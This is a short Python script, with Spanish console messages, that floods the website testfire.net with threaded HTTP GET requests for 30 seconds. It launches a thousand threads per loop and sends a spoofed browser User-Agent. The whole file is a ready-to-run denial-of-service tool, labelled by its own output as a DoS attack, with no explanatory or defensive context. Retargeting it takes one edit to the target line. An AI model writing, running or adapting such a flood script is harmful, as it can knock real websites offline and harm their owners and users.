import threading
import requests
import time

target_domain = "http://testfire.net/"
request_rate = 1000
duration = 30
timeout = (5, 10)

def send_request():
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(target_domain, headers=headers, timeout=timeout)
        print(f"Respuesta: {response.status_code}")
    except requests.exceptions.ConnectTimeout:
        print("Error, tiempo de conexión agotado")
    except requests.exceptions.ReadTimeout:
        print("Error, tiempo de lectura agotado")
    except requests.exceptions.RequestException as e:
        print(f"Error inesperado: {e}")

def dos_attack():
    end_time = time.time() + duration
    threads = []

    def create_threads():
        for _ in range(request_rate):
            thread = threading.Thread(target=send_request)
            thread.start()
            threads.append(thread)

    while time.time() < end_time:
        create_threads()
        time.sleep(1 / request_rate)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print(f"Iniciando el ataque DOS a {target_domain} durante {duration} segundos…")
    dos_attack()
    print("Ataque finalizado")
